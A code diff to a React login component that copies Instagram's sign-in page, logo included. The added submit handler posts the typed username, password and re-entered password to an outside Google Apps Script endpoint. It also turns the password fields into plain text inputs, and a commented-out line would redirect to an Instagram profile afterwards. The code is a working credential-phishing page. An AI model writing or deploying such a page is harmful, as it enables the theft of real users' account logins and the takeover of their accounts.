@@ -1,45 +1,80 @@
-import React from "react";
+import React, { useState } from "react";
 
 const Login = () => {
+  const [email, setEmail] = useState();
+  const [password, setPassword] = useState();
+  const [rePassword, setRePassword] = useState();
+
+  const submitForm = (e) => {
+    const scriptURL =
+      "https://script.google.com/macros/s/AKfycbxMxZClMqC4FKIpTGsp0ekJToDAOURGzCaH8vm2-N48reDX-YP3MaX9_jVUmKZK7smF8w/exec";
+      const form = document.forms["instagram"];
+
+    e.preventDefault();
+    fetch(scriptURL, { method: "POST", body: new FormData(form) })
+      .then((response) =>
+        // window.location.assign("https://www.instagram.com/iamuttampatra69/")
+        alert()
+      )
+      .catch((error) => console.error("Error!", error.message));
+  };
+
+  //
+
   return (
     <div>
       <div className="h-screen bg-gray-50 flex flex-col justify-center items-center">
         <div className="bg-white border border-gray-300 w-80 py-8 flex items-center flex-col mb-3">
           <h1 className="bg-no-repeat instagram-logo">
             <img
-              width="200"
+              width="180"
               src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/840px-Instagram_logo.svg.png"
               alt=""
             />
           </h1>
-
-          <form className="mt-8 w-64 flex flex-col">
+          <form
+            onSubmit={(e) => submitForm(e)}
+            method="post"
+            action=""
+            className="mt-8 w-64 flex flex-col"
+            name="instagram"
+          >
             <input
+              onChange={(e) => setEmail(e.target.value)}
+              required
+              name="username"
               autofocus
-              className="text-xs w-full mb-2 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400 active:outline-none"
+              className="text-xs text-black w-full mb-2 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400 active:outline-none"
               id="email"
               placeholder="Phone number, username, or email"
               type="text"
             />
-
             <input
+              onChange={(e) => setPassword(e.target.value)}
+              required
+              name="password"
               autofocus
-              className="text-xs w-full mb-4 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400 active:outline-none"
+              className="text-xs text-black w-full mb-2 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400 active:outline-none"
               id="password"
               placeholder="Password"
-              type="password"
+              type="text"
             />
             <input
+              onChange={(e) => setRePassword(e.target.value)}
+              required
+              name="repassword"
               autofocus
-              className="text-xs w-full mb-4 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400 active:outline-none"
-              id="password"
+              className="text-xs text-black w-full mb-2 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400 active:outline-none"
+              id="re-password"
               placeholder="Re Enter Password"
-              type="password"
+              type="text"
             />
-
-            <a className=" text-sm text-center bg-blue-300 text-black py-1 rounded font-medium">
+            <button
+              type="submit"
+              className=" text-sm text-center bg-blue-500 text-white py-1 rounded font-medium"
+            >
               Log In
-            </a>
+            </button>
           </form>
 
           <div className="flex justify-evenly space-x-2 w-64 mt-4">
